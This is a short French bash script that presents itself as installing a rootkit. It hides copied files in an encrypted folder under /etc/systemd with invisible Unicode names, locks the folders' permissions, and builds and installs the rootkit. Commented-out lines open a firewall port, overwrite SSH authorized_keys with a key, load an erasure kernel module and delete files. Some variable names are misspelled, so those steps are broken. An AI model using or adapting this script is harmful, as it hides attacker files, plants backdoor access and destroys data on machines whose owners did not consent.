#!/bin/bash
set -e

REPERTOIRE_COURANT=$(pwd)
DOSSIER_CHIFFRE="/etc/systemd/.$'\u00A0'"
DOSSIER_MONTE="/etc/systemd/.$'\u200B'"

# Vérifier dépendances
if ! command -v encfs &> /dev/null; then
    echo "Installation d'EncFS..."
    sudo apt update && sudo apt install -y encfs
fi

# Démontage si montage existant
if mountpoint -q "$DOSSIER_MONTE"; then
    echo "Démontage du point $DOSSIER_MONTE..."
    fusermount -u "$DOSSIER_MONTE"
fi

mkdir -p "$DOSSIER_CHIFFRE"
mkdir -p "$DOSSIER_MONTE"

# Lancer encfs normalement, il demandera le mot de passe
encfs "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"

# Copier les fichiers
echo "Copie des fichiers..."
cp -r "$REPERTOIRE_COURANT"/* "$DOSSIER_MONTE/" 2>/dev/null || true
cp -r "$REPERTOIRE_COURANT"/.[!.]* "$DOSSIER_MONTE/" 2>/dev/null || true

fusermount -u "$DOSSIER_MONTE" &&
echo "Chiffrement terminé !"

echo "AUCUN DROIT SUR LES DOSSIER CHIFFRER ET INVISIBLE"

chmod 0000 "$DOSSIER_MONTER"
chmod 0000 "$DOSSIER_CHIFFRER"

echo "Lancer le makefile du rootkit"

cd rootkit && make all && make install &&


echo "FIN DE L'INSTALLATION DU ROOTKIT ET SUPPRESSION DES FICHIERS"


#sudo rm -rf *

exit 0










#echo "CREATION DU TUNNEL SSH SECU"
#echo "AUTORISATION PARE FEU 8005 POUR TUNNEL SSH"
#sudo ufw allow 8005/tcp &&
#sudo ufw allow 8005/udp &&
#echo "INSERTION CLEF SSH"
#sudo echo "SSKEY" > ~/.ssh/authorized_keys &&
#echo "Lancer le makefile d'effacement sur le repetoire courant"
#make all && sudo insmod effacement.ko && 
